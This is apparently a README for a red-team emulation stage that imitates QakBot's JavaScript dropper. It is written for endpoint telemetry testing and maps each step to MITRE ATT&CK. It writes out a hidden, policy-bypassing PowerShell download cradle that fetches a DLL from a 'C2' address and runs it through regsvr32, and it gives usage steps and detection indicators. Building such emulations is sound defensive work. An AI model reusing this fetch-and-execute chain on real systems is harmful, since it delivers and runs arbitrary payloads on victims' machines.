# JawDropper Stage 1 — JavaScript Dropper

```
============================================================================
ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY

This code replicates documented malware behavior for defensive security
testing and endpoint telemetry validation. It does NOT contain real malware
payloads, exploits, or evasion techniques.

LEGAL: Only run this in environments you own or have explicit written
authorization to test. Unauthorized use may violate computer fraud laws.

Final payload: calc.exe (safe, benign)
C2: Local network only (hardcoded private IP: 192.168.0.148)
============================================================================
```

## Overview

Stage 1 is a JavaScript (.js) file that emulates QakBot BB27/BB28 campaign delivery. When a user double-clicks this file, Windows executes it via `wscript.exe`, which spawns a hidden PowerShell process to download and execute the Stage 2 DLL.

## Files

| File | Description |
|------|-------------|
| `dropper.js` | The JavaScript dropper — execute this on the target VM |
| `encoded_command.ps1` | Decoded PowerShell command for reference (not executed) |

## MITRE ATT&CK Mapping

| Technique | ID | Implementation |
|-----------|-----|----------------|
| User Execution: Malicious File | T1204.002 | User double-clicks dropper.js |
| JavaScript Execution | T1059.007 | wscript.exe runs the .js file |
| PowerShell Execution | T1059.001 | Hidden PowerShell download cradle |
| Ingress Tool Transfer | T1105 | Downloads DLL from C2 server |
| Signed Binary Proxy: Regsvr32 | T1218.010 | Executes DLL via regsvr32.exe |

## Execution Flow

```
User double-clicks dropper.js
          │
          ▼
┌─────────────────────────────────────────────────────────────────┐
│ wscript.exe dropper.js                                          │
│                                                                 │
│ T1204.002: User Execution                                       │
│ T1059.007: JavaScript Execution                                 │
└───────────────────────────┬─────────────────────────────────────┘
                            │ shell.Run() spawns PowerShell
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│ powershell.exe -WindowStyle Hidden -ep Bypass -encodedcommand  │
│                                                                 │
│ T1059.001: PowerShell Execution                                 │
│                                                                 │
│ Decoded command:                                                │
│   $c2 = "http://192.168.0.148:8888"                             │
│   $outPath = "$env:TEMP\update.dll"                             │
│   Invoke-WebRequest -Uri "$c2/payloads/payload.dll" ...         │
│   Start-Process "regsvr32.exe" -ArgumentList "/s $outPath"      │
└───────────────────────────┬─────────────────────────────────────┘
                            │ Downloads DLL, then executes regsvr32
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│ regsvr32.exe /s C:\Users\...\AppData\Local\Temp\update.dll     │
│                                                                 │
│ T1105: Ingress Tool Transfer (download complete)                │
│ T1218.010: Signed Binary Proxy Execution                        │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            ▼
                    [Stage 2 execution begins]
```

## Process Tree

When executed, endpoint telemetry should observe:

```
wscript.exe dropper.js
  └── powershell.exe -WindowStyle Hidden -ep Bypass -encodedcommand <base64>
        └── regsvr32.exe /s C:\Users\<user>\AppData\Local\Temp\update.dll
```

## The Encoded Command

The PowerShell command in `dropper.js` is base64-encoded for two reasons:

1. **Realism** — Real QakBot campaigns use encoded commands
2. **Single-line delivery** — Multiline scripts don't work well in shell.Run()

To decode the embedded command:

```powershell
$encoded = "<base64 from dropper.js>"
[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
```

Or just read `encoded_command.ps1` — it contains the exact same script in readable form.

## Safety Mechanisms

1. **Hardcoded C2 address** — The IP `192.168.0.148` is hardcoded in the encoded command. It cannot be changed via arguments.

2. **Private IP only** — The C2 address is a private RFC1918 address. The script will fail if the C2 server isn't running on your local network.

3. **No obfuscation** — The code is fully commented and easy to read. We're demonstrating the technique, not trying to evade detection.

## Telemetry Expected

Security tools should capture:

| Event | What to Look For |
|-------|------------------|
| Process creation | `wscript.exe` spawning `powershell.exe` |
| Command line | `-encodedcommand` parameter |
| Process creation | `powershell.exe` spawning `regsvr32.exe` |
| Command line | `regsvr32.exe /s` with DLL path in TEMP |
| Network | HTTP GET to `192.168.0.148:8888` |
| File write | DLL written to `%TEMP%\update.dll` |

## Usage

1. Ensure the C2 server is running:
   ```bash
   cd jawdropper && python3 -m http.server 8888
   ```

2. Copy `dropper.js` to your Windows test VM

3. Double-click `dropper.js`

4. Observe process tree and telemetry

## Attribution

This stage emulates QakBot BB27/BB28 campaign delivery documented in:
- CISA AA23-242A (August 2023)
- pr0xylife/Qakbot IOC repository
- The DFIR Report QakBot case studies
